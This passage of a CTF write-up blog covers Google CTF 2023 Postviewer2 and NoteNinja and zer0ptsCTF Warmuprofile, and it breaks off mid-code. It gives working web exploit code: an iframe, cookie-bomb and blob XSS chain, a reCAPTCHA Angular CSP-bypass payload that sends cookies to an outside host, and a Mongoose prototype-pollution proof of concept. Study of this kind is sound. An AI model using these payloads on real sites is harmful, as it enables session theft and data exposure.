href="https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/a15c526d-a65b-45ba-b99f-293595eb8818">https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/a15c526d-a65b-45ba-b99f-293595eb8818</a>‘. The frame attempting to navigate the top-level window is cross-origin and either it or one of its ancestors is not allowed to navigate the top frame.</p></blockquote><p>Later, my teammate found that adding the sandbox attribute to the iframe resolved the issue: <code>frame.sandbox = &#39;allow-modals allow-scripts allow-top-navigation allow-same-origin&#39;</code>. This behavior is worth recording because I thought that not having the sandbox attribute would provide more permissions, but it turns out that adding the sandbox attribute is necessary.</p><p>So the updated process is as follows:</p><ol><li>Load our own webpage first.</li><li>Embed an sbx iframe (f1) to obtain XSS.</li><li>Write a cookie from frame1 to prevent loading the &#x2F;bomb path.</li><li>Add another iframe for &#x2F;bomb (f2) without CSP.</li><li>Add another iframe (f3) for executing operations.</li><li>Modify the HTML of f2 from f3, where the script written will add a blob HTML and then change the top.location.</li><li>Successfully load the blob without any CSP.</li><li>Load the main domain iframe on the blob page.</li></ol><p>At this point, the exploit has already reached 100 lines and is extremely complex:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">createBombFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> bombFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    bombFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> url    bombFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'bombFrame created'</span><span class="token punctuation">)</span>      bombFrame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">          &lt;script>            const domain = document.domain            const cookieCount = 10            const cookieLength = 3000            const expireAfterMinute = 5            setCookieBomb()            function setCookie(key, value) &#123;              const expires = new Date(+new Date() + expireAfterMinute * 60 * 1000);              const v = key + '=' + value + '; path=/bomb; domain=' + domain + '; Secure; SameSite=None; expires=' + expires.toUTCString()              parent.document.cookie = v            &#125;            function setCookieBomb() &#123;              const value = 'Boring' + '_'.repeat(cookieLength)              for (let i=0; i&lt;cookieCount; i++) &#123;                setCookie('key' + i, value);              &#125;            &#125;          &lt;\/script></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>        <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"allow-modals"</span><span class="token punctuation">,</span> <span class="token string">"allow-scripts"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>bombFrame<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">createBrokenFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> brokenFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>      url <span class="token operator">=</span> <span class="token string">'https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/bomb'</span>      brokenFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> url      brokenFrame<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> <span class="token string">'allow-modals allow-scripts allow-top-navigation allow-same-origin'</span>      brokenFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'brokenFrame loaded'</span><span class="token punctuation">)</span>        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      brokenFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'brokenFrame error'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>brokenFrame<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">createXssFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'createXssFrame'</span><span class="token punctuation">)</span>    window<span class="token punctuation">.</span>xssFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    xssFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> url    xssFrame<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> <span class="token string">'allow-modals allow-scripts allow-top-navigation allow-same-origin'</span>    xssFrame<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">            const blob = new Blob(['&lt;html>&lt;head>&lt;script src="YOUR PAYLOAD HERE" />&lt;script>alert(1)&lt;/scr' + 'ipt>&lt;/head>&lt;body>&lt;div />&lt;/body>&lt;/html>'], &#123;                type: 'text/html'            &#125;);            url = URL.createObjectURL(blob)            console.log(url)            window.top.location = url    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    xssFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'xss frame loaded'</span><span class="token punctuation">)</span>      window<span class="token punctuation">.</span>xssFrame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">          &lt;script>            top.frames[1].document.open()            console.log('writing');            console.log('&lt;script>' + window.parent.name + '&lt;/scr' + 'ipt>');            top.frames[1].document.write('&lt;script>' + window.parent.name + '&lt;/scr' + 'ipt>')          &lt;\/script></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"allow-modals"</span><span class="token punctuation">,</span> <span class="token string">"allow-scripts"</span><span class="token punctuation">,</span> <span class="token string">"allow-top-navigation"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>xssFrame<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">createBombFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"sleeping"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"creating broken frame"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">createBrokenFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">createXssFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'got message'</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The main purpose of doing all these steps is just to load the main domain as an iframe, that’s it.</p><p>However, we encountered a roadblock and couldn’t bypass this part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">previewIframe</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> shimUrl<span class="token punctuation">,</span> container<span class="token punctuation">,</span> sandbox <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'allow-scripts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>shimUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>host <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">sbx-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">generateRandomPart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>    container<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        iframe<span class="token punctuation">.</span>contentWindow<span class="token operator">?.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> sandbox<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> url<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>We don’t know what the random domain is, so we can’t use postMessage as it will be blocked. It would be easier if we knew the random domain.</p><p>We searched through various specifications, looked at Chromium source code and bug tracker, but made little progress. The closest we found was this: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&q=subdomain%20host%20leak&can=1">Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank</a>, which is what we needed, but it has already been fixed.</p><p>Just ten minutes before the end of the competition, my teammate found the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Location/ancestorOrigins">location.ancestorOrigins</a> property, and I realized that the child iframe can access the ancestor’s origin, which I had never noticed before (even though it’s the first property of the location object…).</p><p>Due to time constraints, we couldn’t complete it in the end, only a few steps were left.</p><p>The next step is to redirect the iframe with the flag to our prepared blob page, which can leak the sandbox domain using <code>location.ancestorOrigins</code>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">top<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;script>top.postMessage(location.ancestorOrigins[0],"*")&lt;\/script>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Once we have the sandbox domain, we can obtain XSS on this domain. After obtaining XSS, we can access the sandbox domain. Although the location of the iframe has changed, the src of the iframe remains the same, so we can directly access the blob src with the flag. After that, we just need to fetch it to obtain the flag.</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span>top<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>It could have been done in just a few hours initially, what a pity.</p><p>Here is the author’s exploit, worth learning: <a href="https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html">https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html</a></p><h3><span id="noteninja-3-solves">NOTENINJA (3 solves)</span></h3><p>Basically, you can insert any HTML in this challenge, but the key point is the CSP: <code>script-src &#39;self&#39; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;</code></p><p>Initially, I thought this challenge used Next.js and would be similar to the approach used in <a href="https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/">corCTF 2022</a>. However, I tried for a long time but couldn’t figure it out. Only after the competition did I realize that this challenge was just about finding the CSP gadget for recaptcha…</p><p>Inside the recaptcha website, there is an Angular that can be used as a gadget. So the final solution is:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">++++++++++++++++++++++++++++++++++++++<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span>  <span class="token attr-name">ng-controller</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>CarouselController as c<span class="token punctuation">"</span></span>  <span class="token attr-name">ng-init</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>c.init()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&amp;#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">carousel</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">slides</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.google.com/recaptcha/about/js/main.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>++++++++++++++++++++++++++++++++++++++<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It’s also a less-known CSP bypass that I learned.</p><p>Also, another team found a Mongoose 0day vulnerability: <a href="https://huntr.dev/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467/">Mongoose Prototype Pollution Vulnerability in automattic&#x2F;mongoose</a></p><p>The reason is in this line of code: <a href="https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74">https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> Note<span class="token punctuation">.</span><span class="token function">findByIdAndUpdate</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span>req<span class="token punctuation">.</span>body<span class="token punctuation">,</span> <span class="token literal-property property">htmlDescription</span><span class="token operator">:</span> htmlDescription <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>It directly takes in the entire body, and then you can create a prototype pollution through <code>$rename</code>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> connect<span class="token punctuation">,</span> model<span class="token punctuation">,</span> Schema <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'mongoose'</span><span class="token punctuation">;</span><span class="token keyword">await</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token string">'mongodb://127.0.0.1:27017/exploit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> Example <span class="token operator">=</span> <span class="token function">model</span><span class="token punctuation">(</span><span class="token string">'Example'</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Schema</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">hello</span><span class="token operator">:</span> String <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> example <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">hello</span><span class="token operator">:</span> <span class="token string">'world!'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">await</span> Example<span class="token punctuation">.</span><span class="token function">findByIdAndUpdate</span><span class="token punctuation">(</span>example<span class="token punctuation">.</span>_id<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">$rename</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">hello</span><span class="token operator">:</span> <span class="token string">'__proto__.polluted'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// this is what causes the pollution</span><span class="token keyword">await</span> Example<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> test <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span>polluted<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// world!</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [Object: null prototype] &#123; polluted: 'world!' &#125;</span>process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>With this prototype pollution vulnerability, you can use <code>find()</code> to dump all the data and see other people’s notes.</p><h2><span id="zer0ptsctf-2023">zer0ptsCTF 2023</span></h2><p>Let me provide a few references first:</p><ol><li><a href="https://nanimokangaeteinai.hateblo.jp/entry/2023/07/17/101119">zer0pts CTF writeup (in English)</a></li><li><a href="https://blog.arkark.dev/2023/07/17/zer0pts-ctf/">zer0pts CTF 2023 writeup (4 web challs)</a></li><li><a href="https://blog.maple3142.net/2023/07/16/zer0pts-ctf-2023-writeups/">zer0pts CTF 2023 Writeups</a></li></ol><p>The complete code for each challenge is available here: <a href="https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web">https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web</a></p><h3><span id="warmuprofile-48-solves">Warmuprofile (48 solves)</span></h3><p>This challenge is quite interesting. You can add and delete users, and the goal is to create an admin user. However, the admin user already exists, so you need to find a way to delete it.</p><p>The code for deletion is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/user/:username/delete'</span><span class="token punctuation">,</span> needAuth<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> username <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">username</span><span class="token operator">:</span> loggedInUsername <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>loggedInUsername <span class="token operator">!==</span> <span class="token string">'admin'</span> <span class="token operator">&amp;&amp;</span> loggedInUsername <span class="token operator">!==</span> username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">flash</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> <span class="token string">'general user can only delete itself'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// find user to be deleted</span>    <span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">await</span> User<span class="token 